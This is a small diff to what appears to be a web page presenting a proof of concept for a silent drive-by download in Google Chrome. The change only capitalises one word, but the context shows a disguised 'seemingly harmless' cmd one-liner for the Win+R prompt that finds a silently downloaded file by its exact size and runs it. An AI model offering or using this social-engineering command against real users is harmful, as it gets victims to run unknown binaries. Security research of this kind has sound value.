@@ -6,7 +6,7 @@ comments: true
 
 This demonstrates a fully silent drive-by download in Google Chrome, as well as a social engineering component:
 a PoC binary will execute if this seemingly harmless command is entered in a **Win+R** prompt on a Windows system
-(note that you may need to wait for a few seconds before the fun starts):
+(Note that you may need to wait for a few seconds before the fun starts):
 
 <pre>
 cmd /c for /r %g in (*_*) do if %~zg==23456 copy /y "%g" "%g.log" & "%g.log"
